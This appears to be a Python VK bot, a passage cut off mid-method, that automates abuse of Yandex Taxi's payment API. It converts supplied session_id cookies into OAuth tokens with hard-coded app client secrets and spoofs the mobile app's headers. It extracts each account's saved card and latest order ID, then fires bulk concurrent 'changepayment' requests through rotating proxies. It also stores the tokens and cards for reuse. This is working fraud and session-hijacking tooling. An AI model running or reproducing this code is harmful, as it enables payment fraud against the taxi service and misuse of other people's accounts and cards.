import json
import logging
import os
import threading
import asyncio
import time
import random
import re
import sqlite3
import string
import tempfile
from pathlib import Path
from typing import Iterable, Optional, Tuple, List

import aiohttp
import vk_api
from vk_api.longpoll import VkEventType, VkLongPoll

from cfg import VK_TOKEN

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

VK_TOKEN = VK_TOKEN

CHANGE_PAYMENT_URL = "https://tc.mobile.yandex.net/3.0/changepayment"
BASE_DIR = Path(__file__).resolve().parent
DB_PATH = Path(os.getenv("BOT_DB_PATH") or (BASE_DIR / "bot.db"))
MIKE_DB_PATH = Path(os.getenv("MIKE_DB_PATH") or (BASE_DIR / "db" / "DB.bd"))
PROXY_FILE = Path(os.getenv("PROXY_FILE_PATH") or (BASE_DIR / "proxy.txt"))

PROXIES: List[str] = []
_proxy_cycle = None
_proxy_lock = threading.Lock()


class ChangePaymentClient:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.proxy_pool: List[str] = []
        self._session: Optional[aiohttp.ClientSession] = None

    async def start(self):
        if self._session is None:
            self._session = aiohttp.ClientSession()

    async def close(self):
        if self._session is not None:
            await self._session.close()
            self._session = None

    def update_proxies(self, proxies: List[str]):
        self.proxy_pool = list(proxies)
        random.shuffle(self.proxy_pool)

    def _next_proxy(self) -> Optional[str]:
        if not self.proxy_pool:
            return None
        return random.choice(self.proxy_pool)

    async def send_change_payment(
        self,
        headers: dict,
        payload: dict,
        use_proxies: bool,
        max_proxy_attempts: int = 3,
        timeout: float = 15.0,
    ) -> Tuple[bool, Optional[int], Optional[str], Optional[str]]:
        assert self._session is not None, "Сначала вызови start()"

        attempts = max_proxy_attempts if (use_proxies and self.proxy_pool) else 1
        last_exc = None
        used_proxy = None

        for _ in range(attempts):
            proxy = self._next_proxy() if use_proxies and self.proxy_pool else None
            used_proxy = proxy

            try:
                async with self._session.post(
                    self.base_url,
                    json=payload,
                    headers=headers,
                    proxy=proxy,
                    timeout=timeout,
                ) as resp:
                    text = await resp.text()
                    return True, resp.status, text, proxy
            except Exception as e:  # noqa: BLE001
                last_exc = str(e)

        return False, None, last_exc, used_proxy


class SessionService:
    def __init__(self, client: ChangePaymentClient):
        self.client = client

    async def send_one(
        self,
        tg_id: int,
        headers: dict,
        payload: dict,
        session_id: str,
        use_proxies: bool,
        max_attempts: int = 3,
    ) -> Tuple[bool, Optional[int], Optional[str]]:
        await self.client.start()

        for attempt in range(1, max_attempts + 1):
            ok, status_code, response_text, used_proxy = await self.client.send_change_payment(
                headers, payload, use_proxies
            )

            if ok and status_code is not None and 200 <= status_code < 300:
                break

            if status_code in {429} or (status_code is not None and status_code >= 500):
                backoff = min(2 ** attempt * 0.5, 10)
                jitter = random.uniform(0, 0.5)
                await asyncio.sleep(backoff + jitter)
            else:
                break

        enriched_body = dict(payload)
        if used_proxy:
            enriched_body["_used_proxy"] = used_proxy

        log_request_to_db(
            tg_id=tg_id,
            url=CHANGE_PAYMENT_URL,
            headers=headers,
            body=enriched_body,
            status_code=status_code,
            response_body=response_text,
            session_id=session_id,
        )

        return ok, status_code, response_text

    async def run_bulk(
        self,
        tg_id: int,
        headers: dict,
        payload: dict,
        use_proxies: bool,
        total_requests: int,
        concurrency: int,
        session_id: str,
        progress_cb=None,
        stop_event: Optional[asyncio.Event] = None,
    ) -> Tuple[int, int]:
        await self.client.start()
        stop_event = stop_event or asyncio.Event()

        completed = 0
        success = 0
        counter_lock = asyncio.Lock()
        stats_lock = asyncio.Lock()
        next_idx = 0

        async def worker(worker_id: int):
            nonlocal completed, success, next_idx
            while True:
                if stop_event.is_set():
                    return

                async with counter_lock:
                    if stop_event.is_set() or next_idx >= total_requests:
                        return
                    next_idx += 1

                try:
                    ok, status_code, response_text = await self.send_one(
                        tg_id, headers, payload, session_id, use_proxies
                    )
                except Exception as e:  # noqa: BLE001
                    logger.exception("Ошибка при отправке в потоке %s: %s", worker_id, e)
                    ok, status_code, response_text = False, None, str(e)

                async with stats_lock:
                    completed += 1
                    if ok and status_code is not None and 200 <= status_code < 300:
                        success += 1

                if progress_cb:
                    await progress_cb(completed, success, status_code or 0, response_text)

                if stop_event.is_set():
                    return

                await asyncio.sleep(0.3)

        workers = [asyncio.create_task(worker(i)) for i in range(max(concurrency, 1))]
        await asyncio.gather(*workers, return_exceptions=True)
        return completed, success


http_client = ChangePaymentClient(CHANGE_PAYMENT_URL)
session_service = SessionService(http_client)


def load_proxies():
    global PROXIES, _proxy_cycle
    if not os.path.exists(PROXY_FILE):
        logger.warning("proxy.txt не найден, работа без прокси.")
        PROXIES = []
        _proxy_cycle = None
        return

    proxies = []
    with open(PROXY_FILE, "r", encoding="utf-8") as f:
        for line in f:
            p = line.strip()
            if not p:
                continue
            proxies.append(p)

    PROXIES = proxies
    if PROXIES:
        import itertools

        _proxy_cycle = itertools.cycle(PROXIES)
        logger.info("Загружено %d прокси", len(PROXIES))
    else:
        _proxy_cycle = None
        logger.warning("proxy.txt пустой, работа без прокси.")

    http_client.update_proxies(PROXIES)


def proxies_enabled() -> bool:
    return bool(PROXIES)


def proxy_state_text() -> str:
    if PROXIES:
        return f"ВКЛ ({len(PROXIES)} шт.)"
    return "нет доступных прокси"


def get_conn():
    return sqlite3.connect(DB_PATH)


def init_db():
    conn = get_conn()
    cur = conn.cursor()

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL,
            url TEXT NOT NULL,
            method TEXT NOT NULL,
            headers TEXT NOT NULL,
            body TEXT NOT NULL,
            status_code INTEGER,
            response_body TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """
    )

    try:
        cur.execute("ALTER TABLE requests ADD COLUMN session_id TEXT;")
    except sqlite3.OperationalError:
        pass

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS trip_templates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL,
            trip_name TEXT,
            token2 TEXT,
            trip_id TEXT,
            card TEXT,
            orderid TEXT,
            trip_link TEXT,
            session_id TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """
    )

    try:
        cur.execute("ALTER TABLE trip_templates ADD COLUMN session_id TEXT;")
    except sqlite3.OperationalError:
        pass

    try:
        cur.execute("ALTER TABLE trip_templates ADD COLUMN trip_name TEXT;")
    except sqlite3.OperationalError:
        pass

    conn.commit()
    conn.close()


def log_request_to_db(
    tg_id: int,
    url: str,
    headers: dict,
    body: dict,
    status_code: Optional[int],
    response_body: Optional[str],
    session_id: str,
):
    conn = get_conn()
    cur = conn.cursor()

    cur.execute(
        """
        INSERT INTO requests (tg_id, url, method, headers, body, status_code, response_body, session_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?);
        """,
        (
            tg_id,
            url,
            "POST",
            json.dumps(headers, ensure_ascii=False),
            json.dumps(body, ensure_ascii=False),
            status_code,
            response_body,
            session_id,
        ),
    )

    conn.commit()
    conn.close()


def get_request_count_for_user(tg_id: int) -> int:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM requests WHERE tg_id = ?;", (tg_id,))
    (count,) = cur.fetchone()
    conn.close()
    return count or 0


def create_trip_template(tg_id: int) -> int:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO trip_templates (tg_id) VALUES (?);
        """,
        (tg_id,),
    )
    trip_id = cur.lastrowid
    conn.commit()
    conn.close()
    return trip_id


def update_trip_template_field(trip_id: int, tg_id: int, field: str, value: str) -> None:
    if field not in {
        "trip_name",
        "token2",
        "trip_id",
        "card",
        "orderid",
        "trip_link",
        "session_id",
    }:
        return
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        f"UPDATE trip_templates SET {field} = ? WHERE id = ? AND tg_id = ?;",
        (value, trip_id, tg_id),
    )

    if field == "token2":
        cur.execute(
            "UPDATE trip_templates SET session_id = NULL WHERE id = ? AND tg_id = ?;",
            (trip_id, tg_id),
        )
    elif field == "session_id":
        cur.execute(
            "UPDATE trip_templates SET token2 = NULL WHERE id = ? AND tg_id = ?;",
            (trip_id, tg_id),
        )

    conn.commit()
    conn.close()


def list_trip_templates(tg_id: int) -> List[dict]:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        SELECT id, trip_name, token2, trip_id, card, orderid, trip_link, session_id, created_at
        FROM trip_templates
        WHERE tg_id = ?
        ORDER BY id DESC;
        """,
        (tg_id,),
    )
    rows = cur.fetchall()
    conn.close()
    keys = [
        "id",
        "trip_name",
        "token2",
        "trip_id",
        "card",
        "orderid",
        "trip_link",
        "session_id",
        "created_at",
    ]
    return [dict(zip(keys, row)) for row in rows]


def delete_trip_template(trip_id: int, tg_id: int) -> None:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("DELETE FROM trip_templates WHERE id = ? AND tg_id = ?;", (trip_id, tg_id))
    conn.commit()
    conn.close()


def build_headers(user_token: Optional[str] = None, session_cookie: Optional[str] = None) -> dict:
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "ru.yandex.ytaxi/700.100.0.500995 (iPhone; iPhone14,4; iOS 18.3.1; Darwin)",
    }

    if session_cookie:
        headers["Cookie"] = f"Session_id={session_cookie}"
    elif user_token:
        headers["Authorization"] = f"Bearer {user_token}"

    return headers


def build_payload(orderid: str, card: str, _id: str) -> dict:
    return {
        "orderid": orderid,
        "payment_method_type": "card",
        "tips": {
            "decimal_value": "0",
            "type": "percent",
        },
        "payment_method_id": card,
        "id": _id,
    }


def generate_session_id() -> str:
    return str(random.randint(10_000, 9_999_999))


async def do_single_request_and_log(
    tg_id: int,
    headers: dict,
    payload: dict,
    session_id: str,
    use_proxies: bool,
) -> Tuple[bool, Optional[int], Optional[str]]:
    return await session_service.send_one(
        tg_id, headers, payload, session_id, use_proxies
    )


def _pretty_json_or_text(raw: str) -> str:
    try:
        parsed = json.loads(raw)
        return json.dumps(parsed, ensure_ascii=False, indent=2)
    except Exception:  # noqa: BLE001
        return raw


def _generate_random_user_id() -> str:
    letters = [random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(5)]
    digits = [random.choice("0123456789") for _ in range(5)]
    mixed = letters + digits
    random.shuffle(mixed)
    return "".join(mixed)


def _extract_orderid_from_history(resp_text: str) -> Tuple[Optional[str], Optional[float]]:
    orderid: Optional[str] = None
    price: Optional[float] = None

    def _deep_search_for_orderid(obj) -> Optional[str]:
        stack = [obj]
        while stack:
            current = stack.pop()
            if isinstance(current, dict):
                for key, val in current.items():
                    if key in {"orderid", "order_id", "id"} and isinstance(val, (str, int)):
                        if str(val):
                            return str(val)
                    if isinstance(val, (dict, list)):
                        stack.append(val)
            elif isinstance(current, list):
                stack.extend(current)
        return None

    try:
        payload = json.loads(resp_text)
        orders = (
            payload.get("orders")
            or payload.get("result", {}).get("orders")
            or payload.get("data", {}).get("orders")
        )
        if isinstance(orders, list) and orders:
            item = orders[0]
            if isinstance(item, dict):
                data = item.get("data")
                if isinstance(data, dict):
                    item_id = data.get("item_id")
                    if isinstance(item_id, dict):
                        nested = item_id.get("order_id") or item_id.get("orderid")
                        if isinstance(nested, (str, int)) and nested:
                            orderid = str(nested)

                    if orderid is None:
                        for key in ("orderid", "order_id"):
                            val = data.get(key)
                            if isinstance(val, (str, int)) and val:
                                orderid = str(val)
                                break

                    payment = data.get("payment")
                    if isinstance(payment, dict):
                        raw_price = None
                        for key in ("cost", "final_cost"):
                            candidate = payment.get(key)
                            if isinstance(candidate, (int, float)):
                                raw_price = float(candidate)
                                break
                            if isinstance(candidate, str) and candidate:
                                price_match = re.search(r"([0-9]+(?:[\\.,][0-9]+)?)", candidate)
                                if price_match:
                                    raw_price = float(price_match.group(1).replace(",", "."))
                                    break

                        if raw_price is not None:
                            price = raw_price

                if orderid is None:
                    for key in ("orderid", "order_id", "id"):
                        val = item.get(key)
                        if isinstance(val, (str, int)) and val:
                            orderid = str(val)
                            break

                if orderid is None:
                    orderid = _deep_search_for_orderid(item)
    except Exception:  # noqa: BLE001
        pass

    if orderid is None:
        match = re.search(r"\"orderid\"\\s*:\\s*\"([^\"]+)\"", resp_text)
        if match:
            orderid = match.group(1)

    if orderid is None:
        match = re.search(r"\"order_id\"\\s*:\\s*\"([^\"]+)\"", resp_text)
        if match:
            orderid = match.group(1)

    return orderid, price


async def fetch_order_history_orderid(
    token2: str, session_id: str
) -> Tuple[Optional[str], Optional[float], str]:
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) yandex-taxi/700.116.0.501961",
        "Connection": "keep-alive",
        "Authorization": f"Bearer {token2}",
        "X-YaTaxi-UserId": _generate_random_user_id(),
        "Cookie": f"Session_id={session_id}",
    }

    body = {
        "services": {
            "taxi": {"image_tags": {"size_hint": 9999}, "flavors": ["default"]},
            "eats": {},
            "grocery": {},
            "grocery_b2b": {},
            "drive": {},
            "scooters": {},
            "qr_pay": {},
            "shuttle": {},
            "market": {},
            "market_locals": {},
            "delivery": {},
            "korzinkago": {},
            "dealcart": {},
            "naheed": {},
            "almamarket": {},
            "supermarketaz": {},
            "chargers": {},
            "cartech": {},
            "afisha": {},
            "masstransit": {},
            "shop": {},
            "pharma": {},
            "ambulance": {},
            "places_bookings": {},
            "buy_sell": {},
        },
        "range": {"results": 20},
        "country_code": "RU",
        "include_service_metadata": True,
        "is_updated_masstransit_history_available": True,
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://m.taxi.yandex.ru/order-history-frontend/api/4.0/orderhistory/v2/list",
            json=body,
            headers=headers,
        ) as resp:
            resp_text = await resp.text()

    orderid, price = _extract_orderid_from_history(resp_text)
    return orderid, price, resp_text


async def fetch_token2(session_id: str) -> Optional[str]:
    headers = {
        "Host": "mobileproxy.passport.yandex.net",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Content-Length": "125",
        "User-Agent": "com.yandex.mobile.auth.sdk/6.20.9.1147 (Apple iPhone15,3; iOS 17.0.2)",
        "Accept-Language": "ru-RU;q=1",
        "Ya-Client-Host": "yandex.ru",
        "Ya-Client-Cookie": f"Session_id={session_id}",
    }

    data = (
        "client_id=c0ebe342af7d48fbbbfcf2d2eedb8f9e&client_secret=ad0a908f0aa341a182a37ecd75bc319e"
        "&grant_type=sessionid&host=yandex.ru"
    )

    access_token = None
    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://mobileproxy.passport.yandex.net/1/bundle/oauth/token_by_sessionid",
            data=data,
            headers=headers,
        ) as resp:
            resp_text = await resp.text()

    token_match = re.search(r"\"access_token\":\"([^\"]+)\"", resp_text)
    if token_match:
        access_token = token_match.group(1)
    if not access_token:
        return None

    token_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
    }

    token_payload = (
        "grant_type=x-token"
        f"&access_token={access_token}"
        "&client_id=f576990d844e48289d8bc0dd4f113bb9"
        "&client_secret=c6fa15d74ddf4d7ea427b2f712799e9b"
        "&payment_auth_retpath=https%3A%2F%2Fpassport.yandex.ru%2Fclosewebview"
    )

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://mobileproxy.passport.yandex.net/1/token",
            data=token_payload,
            headers=token_headers,
        ) as resp:
            token_resp_text = await resp.text()

    token2_match = re.search(r"\"access_token\": ?\"([^\"]+)\"", token_resp_text)
    if token2_match:
        return token2_match.group(1)
    return None


async def fetch_session_details(session_id: str) -> dict:
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "yango/1.6.0.49 go-platform/0.1.19 Android/",
    }

    cookies = {"Session_id": session_id}
    result: dict = {"session_id": session_id, "_debug_responses": []}

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://tc.mobile.yandex.net/3.0/launch", json={}, headers=headers, cookies=cookies
        ) as resp:
            launch_text = await resp.text()

    result["_debug_responses"].append(
        {
            "step": "launch",
            "response": f"ID профиля: {result.get('trip_id', '—')}",
        }
    )

    user_id_match = re.search(r"\"id\":\"([^\"]+)\"", launch_text)
    if user_id_match:
        result["trip_id"] = user_id_match.group(1)

    if "trip_id" not in result:
        return result

    payment_headers = dict(headers)
    payment_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"

    payload = json.dumps({"id": result["trip_id"]}, ensure_ascii=False)

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://tc.mobile.yandex.net/3.0/paymentmethods",
            data=payload,
            headers=payment_headers,
            cookies=cookies,
        ) as resp:
            payment_text = await resp.text()

    result["_debug_responses"].append(
        {
            "step": "paymentmethods",
            "response": f"Карта: {result.get('card', '—')}",
        }
    )

    card_match = re.search(r"\"id\":\"(card[^\"]*)\"", payment_text)
    if card_match:
        result["card"] = card_match.group(1)

    token2 = await fetch_token2(session_id)
    if token2:
        orderid, price, history_resp = await fetch_order_history_orderid(token2, session_id)
        result["_debug_responses"].append(
            {"step": "order_history", "response": _pretty_json_or_text(history_resp)}
        )
        if orderid:
            result["orderid"] = orderid
        if price is not None:
            result["price"] = price

    return result


async def fetch_trip_details_from_token(token2: str) -> dict:
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "yango/1.6.0.49 go-platform/0.1.19 Android/",
        "Authorization": f"Bearer {token2}",
    }

    result: dict = {"token2": token2, "_debug_responses": []}

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://tc.mobile.yandex.net/3.0/launch", json={}, headers=headers
        ) as resp:
            launch_text = await resp.text()

    result["_debug_responses"].append(
        {
            "step": "launch",
            "response": f"ID профиля: {result.get('trip_id', '—')}",
        }
    )

    user_id_match = re.search(r"\"id\":\"([^\"]+)\"", launch_text)
    if user_id_match:
        result["trip_id"] = user_id_match.group(1)

    if "trip_id" not in result:
        return result

    payment_headers = dict(headers)
    payment_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"

    payload = json.dumps({"id": result["trip_id"]}, ensure_ascii=False)

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://tc.mobile.yandex.net/3.0/paymentmethods",
            data=payload,
            headers=payment_headers,
        ) as resp:
            payment_text = await resp.text()

    result["_debug_responses"].append(
        {
            "step": "paymentmethods",
            "response": f"Карта: {result.get('card', '—')}",
        }
    )

    card_match = re.search(r"\"id\":\"(card[^\"]*)\"", payment_text)
    if card_match:
        result["card"] = card_match.group(1)

    return result


class VkBot:
    def __init__(self, token: str):
        self.vk_session = vk_api.VkApi(token=token)
        self.longpoll = VkLongPoll(self.vk_session)
        self.vk = self.vk_session.get_api()
        self.state: dict[int, dict] = {}

    def send(self, user_id: int, text: str, keyboard: dict | None = None):
        payload = {
            "user_id": user_id,
            "message": text,
            "random_id": 0,
        }
        if keyboard:
            payload["keyboard"] = json.dumps(keyboard, ensure_ascii=False)
        self.vk.messages.send(**payload)

    def start_keyboard(self) -> dict:
        return {
            "one_time": False,
            "inline": False,
            "buttons": [
                [
                    {
                        "action": {"type": "text", "label": "➕ Добавить поездку"},
                        "color": "primary",
                    },
                    {
                        "action": {"type": "text", "label": "💳 Поменять оплату"},
                        "color": "secondary",
                    },
                ],
                [
                    {
                        "action": {"type": "text", "label": "🗂 Поездки"},
                        "color": "primary",
                    }
                ],
            ],
        }

    def mode_keyboard(self) -> dict:
        return {
            "one_time": False,
            "inline": False,
            "buttons": [
                [
                    {
                        "action": {"type": "text", "label": "🎯 Одиночная смена"},
                        "color": "primary",
                    }
                ],
                [
                    {
                        "action": {"type": "text", "label": "🚀 Запустить потоки"},
                        "color": "primary",
                    }
                ],
                [
                    {
                        "action": {"type": "text", "label": "🔙 Назад"},
                        "color": "secondary",
                    }
                ],
            ],
        }

    def schedule_keyboard(self) -> dict:
        return {
            "one_time": False,
            "inline": False,
            "buttons": [
                [
                    {
                        "action": {"type": "text", "label": "Отправить сейчас"},
                        "color": "primary",
                    }
                ],
                [
                    {
                        "action": {"type": "text", "label": "Отправить через..."},
                        "color": "secondary",
                    }
                ],
            ],
        }

    def reset_state(self, user_id: int):
        pending = self.state.pop(user_id, None)
        timer = (pending or {}).get("timer")
        if isinstance(timer, threading.Timer):
            timer.cancel()

    def update_state(self, user_id: int, **kwargs):
        current = self.state.setdefault(user_id, {})
        current.update(kwargs)

    def handle_change_payment_mode(self, user_id: int, text: str) -> bool:
        lowered = text.lower()
        current_data = self.state.get(user_id, {}).get("data", {})
        if lowered in {"🎯 одиночная смена", "одиночная смена"}:
            self.update_state(user_id, flow="single", step="token", data=current_data)
            if current_data.get("token") or current_data.get("session_cookie"):
                if not current_data.get("orderid"):
                    self._ask_next_field(user_id, "orderid")
                elif not current_data.get("card"):
                    self._ask_next_field(user_id, "card")
                elif not current_data.get("id"):
                    self._ask_next_field(user_id, "id")
                else:
                    self._ask_schedule(user_id)
            else:
                self.send(
                    user_id,
                    "Пришли token2 или session_id. Если укажешь session_id — token2 очищу.",
                )
            return True

        if lowered in {"🚀 запустить потоки", "запустить потоки"}:
            self.update_state(user_id, flow="bulk", step="token", data=current_data)
            if current_data.get("token") or current_data.get("session_cookie"):
                if not current_data.get("orderid"):
                    self._ask_next_field(user_id, "orderid")
                elif not current_data.get("card"):
                    self._ask_next_field(user_id, "card")
                elif not current_data.get("id"):
                    self._ask_next_field(user_id, "id")
                elif not current_data.get("threads"):
                    self._ask_next_field(user_id, "threads")
                else:
                    self._ask_next_field(user_id, "total")
            else:
                self.send(
                    user_id,
                    "Пришли token2 или session_id для потоков. Если дадим session_id — token2 не понадобится.",
                )
            return True
        return False

    def _format_response(self, ok: bool, status: int | None, response: str | None, session_id: str) -> str:
        proxy_state = proxy_state_text()
        body = (response or "")[:800]
        if ok:
            return (
                "✅ Запрос отправлен.\n"
                f"ID сессии: {session_id}\n"
                f"Прокси: {proxy_state}\n"
                f"Статус: {status}\n"
                f"Ответ: {body}"
            )
        return (
            "❌ Не удалось отправить запрос.\n"
            f"ID сессии: {session_id}\n"
            f"Прокси: {proxy_state}\n"
            f"Статус: {status}\n"
            f"Ответ: {body}"
        )

    def _run_single(self, user_id: int, data: dict):
        async def _job():
            session_id = generate_session_id()
            headers = build_headers(data.get("token"), data.get("session_cookie"))
            payload = build_payload(data.get("orderid"), data.get("card"), data.get("id"))
            ok, status, resp = await do_single_request_and_log(
                user_id, headers, payload, session_id, proxies_enabled()
            )
            return session_id, ok, status, resp

        return asyncio.run(_job())

    def _run_bulk(self, user_id: int, data: dict, threads: int, total_requests: int):
        async def _job():
            session_id = generate_session_id()
            headers = build_headers(data.get("token"), data.get("session_cookie"))
            payload = build_payload(data.get("orderid"), data.get("card"), data.get("id"))

            completed, success = await session_service.run_bulk(
                user_id,
                headers,
                payload,
                proxies_enabled(),
                total_requests,
                threads,
                session_id,
            )
            return session_id, completed, success

        return asyncio.run(_job())

    def _format_trip(self, idx: int, trip: dict) -> str:
        created = trip.get("created_at") or ""
        created_short = str(created)[:19] if created else "—"
        name = trip.get("trip_name") or f"Поездка #{trip.get('id')}"
        parts = [f"{idx}) {name} • добавлена {created_short}"]
        fields = []
        if trip.get("orderid"):
            fields.append(f"orderid: {trip['orderid']}")
        if trip.get("trip_id"):
            fields.append(f"ID: {trip['trip_id']}")
        if trip.get("card"):
            fields.append(f"card-x: {trip['card']}")
        if trip.get("token2"):
            fields.append("token2 ✓")
        if trip.get("session_id"):
            fields.append("session_id ✓")
        parts.append(", ".join(fields) if fields else "пусто")
        return "\n".join(parts)

    def _send_trips_list(self, user_id: int):
        trips = list_trip_templates(user_id)
        if not trips:
            self.send(user_id, "У тебя пока нет поездок. Добавь новую.", self.start_keyboard())
            return
        lines = ["📋 Твои поездки:"]
        for idx, trip in enumerate(trips, start=1):
            lines.append(self._format_trip(idx, trip))
        lines.append(
            "\nНапиши номер, чтобы использовать её.\n"
            "Напиши 'данные N' — показать параметры.\n"
            "Напиши 'удалить N' — удалить.\n"
            "Напиши 'очистить все' — удалить все поездки."
        )
        self.update_state(user_id, step="trip_list", trips=trips)
        self.send(user_id, "\n".join(lines), self.start_keyboard())

    def _prepare_trip_creation(self, user_id: int):
        trip_id = create_trip_template(user_id)
        self.update_state(user_id, step="trip_orderid_new", active_trip=trip_id, data={})
        self.send(
            user_id,
            "Введи orderid.\nПосле этого пришли token2 — карту и ID подставлю автоматически.",
        )

    def _fill_trip_field(self, user_id: int, field: str, value: str):
        trip_id = self.state.get(user_id, {}).get("active_trip")
        if not trip_id:
            self.send(user_id, "Не нашёл активную поездку, начни заново.", self.start_keyboard())
            return False
        if value and value != "-":
            update_trip_template_field(trip_id, user_id, field, value)
        return True

    def _use_trip(self, user_id: int, trip: dict):
        token = trip.get("token2")
        session_cookie = trip.get("session_id")
        if not token and not session_cookie:
            self.send(user_id, "В этой поездке нет token2/session_id. Заполни и попробуй снова.", self.start_keyboard())
            return
        data = {}
        if session_cookie:
            data["session_cookie"] = session_cookie
        elif token:
            data["token"] = token
        if trip.get("orderid"):
            data["orderid"] = trip.get("orderid")
        if trip.get("card"):
            data["card"] = trip.get("card")
        if trip.get("trip_id"):
            data["id"] = trip.get("trip_id")

        autofill_notes: list[str] = []
        if not all([data.get("card"), data.get("id")]):
            if data.get("session_cookie"):
                autofill_notes.extend(self._autofill_from_session(data["session_cookie"], data))
                self._autofill_trip_template(trip.get("id"), user_id, data["session_cookie"], is_session=True)
            elif data.get("token"):
                note = self._autofill_from_token(data["token"], data)
                if note:
                    autofill_notes.append(note)
                self._autofill_trip_template(trip.get("id"), user_id, data["token"], is_session=False)
        if autofill_notes:
            self.send(user_id, "\n".join(autofill_notes))

        self.reset_state(user_id)
        self.update_state(user_id, data=data, step="choose_mode", flow=None, active_trip=trip.get("id"))
        self.send(
            user_id,
            "Данные поездки перенесены. Выбирай режим: одиночная смена или потоки.",
            self.mode_keyboard(),
        )

    def _ask_next_field(self, user_id: int, step: str):
        prompts = {
            "orderid": "Теперь введи orderid:",
            "card": "Теперь card-x:",
            "id": "Введи ID поездки:",
            "threads": "Сколько потоков запустить одновременно?",
            "total": "Сколько всего логических запросов отправить?",
        }
        keyboard = None
        self.update_state(user_id, step=step)
        self.send(user_id, prompts.get(step, ""), keyboard)

    def _ask_schedule(self, user_id: int):
        self.update_state(user_id, step="schedule")
        self.send(
            user_id,
            "Когда отправить запросы?",
            self.schedule_keyboard(),
        )

    def _ensure_request_data(self, user_id: int, data: dict, trip_id: int | None = None) -> bool:
        notes: list[str] = []
        if not all([data.get("card"), data.get("id"), data.get("orderid")]):
            if data.get("session_cookie"):
                notes.extend(self._autofill_from_session(data["session_cookie"], data))
            elif data.get("token"):
                note = self._autofill_from_token(data["token"], data)
                if note:
                    notes.append(note)
        if trip_id:
            if data.get("card"):
                update_trip_template_field(trip_id, user_id, "card", data["card"])
            if data.get("id"):
                update_trip_template_field(trip_id, user_id, "trip_id", data["id"])
            if data.get("orderid"):
                update_trip_template_field(trip_id, user_id, "orderid", data["orderid"])
        if notes:
            self.send(user_id, "\n".join(notes))
        return all([data.get("card"), data.get("id"), data.get("orderid")])

    def _autofill_from_token(self, token: str, data: dict) -> str | None:
        try:
            parsed = asyncio.run(fetch_trip_details_from_token(token))
        except Exception as exc:  # noqa: BLE001
            logger.warning("Не удалось автоматически получить данные по token2: %s", exc)
            return None

        notes = []
        if parsed.get("trip_id") and not data.get("id"):
            data["id"] = parsed["trip_id"]
            notes.append(f"ID: {parsed['trip_id']}")
        if parsed.get("card") and not data.get("card"):
            data["card"] = parsed["card"]
            notes.append(f"card-x: {parsed['card']}")

        if not notes:
            return None
        return "Нашёл в token2: " + ", ".join(notes)

    def _autofill_from_session(self, session_id: str, data: dict) -> Iterable[str]:
        try:
            parsed = asyncio.run(fetch_session_details(session_id))
        except Exception as exc:  # noqa: BLE001
            logger.warning("Не удалось автоматически получить данные по session_id: %s", exc)
            return []

        notes: list[str] = []
        if parsed.get("trip_id") and not data.get("id"):
            data["id"] = parsed["trip_id"]
            notes.append(f"ID: {parsed['trip_id']}")
        if parsed.get("card") and not data.get("card"):
            data["card"] = parsed["card"]
            notes.append(f"card-x: {parsed['card']}")
        if parsed.get("orderid") and not data.get("orderid"):
            data["orderid"] = parsed["orderid"]
            notes.append(f"orderid: {parsed['orderid']}")
        return notes

    def _autofill_trip_template(self, trip_id: int, user_id: int, source: str, is_session: bool):
        try:
            parsed = (
                asyncio.run(fetch_session_details(source))
                if is_session
                else asyncio.run(fetch_trip_details_from_token(source))
            )
        except Exception as exc:  # noqa: BLE001
            logger.warning("Не удалось автозаполнить поездку (%s): %s", source, exc)
            return None

        updated_fields: list[str] = []

        for field in ("trip_id", "card", "orderid"):
            value = parsed.get(field)
            if value:
                update_trip_template_field(trip_id, user_id, field, value)
                updated_fields.append(field)

        if not updated_fields:
            return None

        details = []
        if parsed.get("trip_id"):
            details.append(f"ID: {parsed['trip_id']}")
        if parsed.get("card"):
            details.append(f"card-x: {parsed['card']}")
        if parsed.get("orderid"):
            details.append(f"orderid: {parsed['orderid']}")

        details_text = f" ({', '.join(details)})" if details else ""
        return f"Автоматически дополнил поля{details_text}."

    def handle_stateful_input(self, user_id: int, text: str) -> bool:
        state = self.state.get(user_id) or {}
        step = state.get("step")
        data = state.get("data", {})
        trips = state.get("trips", [])

        if step == "choose_mode":
